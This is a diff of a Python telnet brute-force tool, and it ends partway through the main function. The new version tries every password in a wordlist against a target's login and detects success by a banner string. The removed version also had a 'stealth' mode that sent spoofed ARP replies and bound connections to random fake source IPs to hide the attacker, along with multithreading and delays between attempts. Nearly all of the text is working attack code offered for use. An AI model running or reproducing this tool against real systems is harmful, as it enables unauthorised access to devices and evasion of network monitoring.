@@ -1,178 +1,137 @@
 #!/usr/bin/env python3
-# Telnet Brute Force Tool with ARP Stealth Mode
+# Telnet Brute Force
 
 import argparse
-import threading
 import socket
-import time
-import os
 import sys
 import signal
-import random
+import time
+import threading
 from telnetlib import Telnet
-from scapy.all import ARP, send
 
-RED    = "\033[38;2;255;0;0m"
-GREEN  = "\033[38;2;0;255;0m"
-RESET  = "\033[0m"
-BOLD   = "\033[1m"
+RED = "\033[38;2;255;0;0m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
 
-stopAttack    = False
-attemptsDone  = 0
-startTime     = 0
-lock          = threading.Lock()
+DEFAULT_PORT = 23
+SUCCESS_BANNER_TEMPLATE = "Login the CLI by {}"
 
-def SignalHandler(sig, frame):
-    global stopAttack
-    print(f"\n{RED}Stopping brute force...{RESET}")
-    stopAttack = True
-    sys.exit(0)
+stopTimer = False
+progressLine = ""
+timerThread = None
+stdoutLock = threading.Lock()
 
-def FormatDuration(seconds):
-    mins, secs = divmod(int(seconds), 60)
-    hrs, mins = divmod(mins, 60)
-    return f"{hrs:02}:{mins:02}:{secs:02}"
-
-def PrintProgress(total):
-    while not stopAttack:
+def UpdateTimer(startTime):
+    while not stopTimer:
         elapsed = time.time() - startTime
-        with lock:
-            print(f"\r{RED}Attempts: {attemptsDone}/{total} | Duration: {FormatDuration(elapsed)}{RESET}", end="")
+        elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+        with stdoutLock:
+            sys.stdout.write(f"\r{progressLine} | Duration: {BOLD}{elapsedFmt}{RESET}")
+            sys.stdout.flush()
         time.sleep(1)
 
-def AttemptLogin(host, port, username, password, sourceIp=None):
+def ShowBanner():
+    print("=" * 50)
+    print("        Telnet Brute Force Tool")
+    print(f"        Default Port: {DEFAULT_PORT}")
+    print("=" * 50)
+
+def TelnetBruteForce(host, port, username, passwords):
+    global stopTimer, progressLine, timerThread
+
+    successBanner = SUCCESS_BANNER_TEMPLATE.format(username)
+    total = len(passwords)
+    attempts = 0
+
+    ShowBanner()
+    print(f"\n[*] Starting brute force: {username}@{host}:{port} ({total} passwords)")
+    startTime = time.time()
+
+    progressLine = f"Attempts: {BOLD}0/{total}{RESET} | Last: {BOLD}---{RESET}"
+    stopTimer = False
+    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
+    timerThread.start()
+
+    for pwd in passwords:
+        attempts += 1
+        progressLine = (f"Attempts: {BOLD}{attempts}/{total}{RESET} | "
+                        f"Last: {BOLD}{pwd}{RESET}")
+        with stdoutLock:
+            sys.stdout.write(f"\r{progressLine}")
+            sys.stdout.flush()
+
+        if TryPassword(host, port, username, pwd, successBanner):
+            print(f"\n\n{BOLD}[+] SUCCESS:{RESET} {username}:{pwd}")
+            stopTimer = True
+            timerThread.join()
+            return
+
+    stopTimer = True
+    timerThread.join()
+    print(f"\n\n{RED}[-] No valid password found.{RESET}")
+
+def TryPassword(host, port, username, password, successBanner):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        if sourceIp:
-            sock.bind((sourceIp, 0))
+        sock = socket.socket()
         sock.settimeout(5)
         sock.connect((host, port))
 
         tn = Telnet()
         tn.sock = sock
 
-        banner = tn.read_until(b"User:", timeout=5).decode(errors="ignore")
-        if "User" not in banner:
-            return False
+        tn.read_until(b"User:", timeout=5)
+        tn.write((username + "\r\n").encode())
+        tn.read_until(b"Password:", timeout=5)
+        tn.write((password + "\r\n").encode())
 
-        tn.write(username.encode() + b"\n")
-        if b"Password:" not in tn.read_until(b"Password:", timeout=5):
-            return False
-
-        tn.write(password.encode() + b"\n")
-        time.sleep(1.5)
+        time.sleep(0.1)
         output = tn.read_very_eager().decode(errors="ignore")
         tn.close()
-
-        return f"Login the CLI by {username}" in output
-
-    except Exception as e:
+        return successBanner in output
+    except Exception:
         return False
     finally:
-        try:
-            sock.close()
-        except:
-            pass
+        try: sock.close()
+        except: pass
 
-def ArpSpoofOnce(targetIp, fakeIp, iface):
-    pkt = ARP(op=2, pdst=targetIp, psrc=fakeIp, hwdst="ff:ff:ff:ff:ff:ff")
-    send(pkt, iface=iface, verbose=False)
-
-def WorkerNormal(host, port, username, passwords, delay):
-    global attemptsDone, stopAttack
-    for pwd in passwords:
-        if stopAttack:
-            break
-        if AttemptLogin(host, port, username, pwd):
-            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
-            stopAttack = True
-            break
-        with lock:
-            attemptsDone += 1
-        time.sleep(delay)
-
-def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
-    global attemptsDone, stopAttack
-    for pwd in passwords:
-        if stopAttack:
-            break
-        fakeIp = f"{subnetPrefix}.{random.randint(2, 254)}"
-        ArpSpoofOnce(host, fakeIp, iface)
-        if AttemptLogin(host, port, username, pwd, sourceIp=fakeIp):
-            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
-            stopAttack = True
-            break
-        with lock:
-            attemptsDone += 1
-        time.sleep(delay)
-
-def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
-    global startTime, attemptsDone, stopAttack
-    startTime = time.time()
-    attemptsDone = 0
-    stopAttack = False
-    total = len(passwords)
-
-    threading.Thread(target=PrintProgress, args=(total,), daemon=True).start()
-
-    slices = [passwords[i::threadsCount] for i in range(threadsCount)]
-    threads = []
-    for i in range(threadsCount):
-        if mode == "stealth":
-            t = threading.Thread(target=WorkerStealth, args=(host, port, username, slices[i], subnetPrefix, iface, delay))
-        else:
-            t = threading.Thread(target=WorkerNormal, args=(host, port, username, slices[i], delay))
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
-
-    duration = FormatDuration(time.time() - startTime)
-    print(f"\n{RED}Attack complete. Total attempts: {attemptsDone} | Duration: {duration}{RESET}")
+def LoadPasswords(path):
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+            return [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        print(f"{RED}[!] Wordlist not found: {path}{RESET}")
+        sys.exit(1)
 
 def menu():
-    host      = input(f"{RED}Target IP: {RESET}").strip()
-    port      = int(input(f"{RED}Port [23]: {RESET}") or "23")
-    username  = input(f"{RED}Username [root]: {RESET}").strip() or "root"
-    threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
-    delay     = float(input(f"{RED}Delay between attempts (s) [1.0]: {RESET}") or "1.0")
-    wordlist  = os.path.join(os.path.dirname(__file__), "passwords.txt")
-
-    if not os.path.exists(wordlist):
-        print(f"{RED}passwords.txt not found{RESET}")
-        return
-    with open(wordlist) as f:
-        passwords = [l.strip() for l in f if l.strip()]
-
-    mode = input(f"{RED}Mode: [1] Normal [2] Stealth (ARP spoof): {RESET}").strip()
-    if mode == "2":
-        subnetPrefix = input(f"{RED}Subnet prefix (e.g. 192.168.1): {RESET}").strip()
-        iface        = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
-        StartAttack(host, port, username, passwords, "stealth", subnetPrefix, iface, threads, delay)
-    else:
-        StartAttack(host, port, username, passwords, "normal", None, None, threads, delay)
+    host = input(f"\n{RED}Target IP: {RESET}").strip()
+    username = input(f"{RED}Username : {RESET}").strip()
+    wordlist = input(f"{RED}Wordlist [default: passwords.txt]: {RESET}").strip() or "passwords.txt"
+    passwords = LoadPasswords(wordlist)
+    TelnetBruteForce(host, DEFAULT_PORT, username, passwords)
 
 def terminal():
-    parser = argparse.ArgumentParser(description="Telnet Brute Force Tool")
-    parser.add_argument("-i", "--host", required=True, help="Target IP")
-    parser.add_argument("-P", "--port", type=int, default=23, help="Telnet port")
-    parser.add_argument("-u", "--username", default="root", help="Login username")
-    parser.add_argument("-m", "--mode", choices=["normal", "stealth"], default="normal", help="Attack mode")
-    parser.add_argument("--subnet", help="Subnet prefix for stealth mode")
-    parser.add_argument("--iface", help="Network interface for stealth mode")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
-    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between attempts in seconds")
+    parser = argparse.ArgumentParser(
+        description="Telnet Brute Force Tool",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    parser.add_argument("-t", "--target", required=True, help="Target IP address")
+    parser.add_argument("-u", "--username", required=True, help="Username to brute")
+    parser.add_argument("-w", "--wordlist", default="passwords.txt",
+                        help="Path to wordlist (default: passwords.txt)")
+    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
+                        help=f"Telnet port (default: {DEFAULT_PORT})")
     args = parser.parse_args()
 
-    wordlist = os.path.join(os.path.dirname(__file__), "passwords.txt")
-    if not os.path.exists(wordlist):
-        print(f"{RED}passwords.txt not found{RESET}")
-        return
-    with open(wordlist) as f:
-        passwords = [l.strip() for l in f if l.strip()]
+    passwords = LoadPasswords(args.wordlist)
+    TelnetBruteForce(args.target, args.port, args.username, passwords)
 
-    StartAttack(args.host, args.port, args.username, passwords, args.mode, args.subnet, args.iface, args.threads, args.delay)
+def SignalHandler(sig, frame):
+    global stopTimer, timerThread
+    print(f"\n{RED}[!] Stopping attack...{RESET}")
+    stopTimer = True
+    if timerThread and timerThread.is_alive():
+        timerThread.join()
+    sys.exit(0)
 
 def main():
     signal.signal(signal.SIGINT, SignalHandler)
